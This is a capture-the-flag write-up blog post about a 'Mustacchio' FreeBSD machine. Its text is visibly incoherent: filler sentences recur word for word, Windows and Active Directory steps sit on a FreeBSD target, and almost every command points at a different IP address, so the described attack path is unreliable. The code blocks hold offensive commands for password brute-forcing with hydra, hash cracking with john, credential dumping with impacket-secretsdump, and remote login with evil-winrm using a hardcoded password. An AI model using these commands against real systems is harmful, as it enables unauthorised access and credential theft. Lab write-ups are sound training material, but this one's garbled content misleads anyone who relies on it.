---
TitleSEO: "PwnTillDawn — Mustacchio (Insane FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Mustacchio (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Mustacchio. SeImpersonatePrivilege and Cron Job to achieve insane compromise on FreeBSD."
Keywords: "offsec, tryhackme, linux, medium, insane"
URL: "https://zurefx.github.io/writeups/htb-mustacchio-506.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mustacchio-506/"
Date: "2025-12-01"
Tags: "OffSec, TryHackMe, Linux, Medium, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-mustacchio-506"
Permalink: "/writeups/htb-mustacchio-506.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Mustacchio** is rated **Insane** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.17.83.66`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.121.217 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.48.212.150/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.161.69 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.44.58.116 -u administrator -p 'P@ssw0rd!' --shares
```

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

### SMB Enumeration

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.20.237.86
gobuster dir -u http://10.95.101.250/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **Cron Job**.

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.96.69.212/FUZZ
gobuster dir -u http://10.59.17.7/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.26.90.36/FUZZ
evil-winrm -i 10.105.50.168 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `sharphound`
- `bloodhound`
- `dcomexec`
- `enum4linux`
- `msfvenom`
- `netcat`
- `psexec`
- `wmiexec`

### Key Takeaways

- SeImpersonatePrivilege
- Cron Job
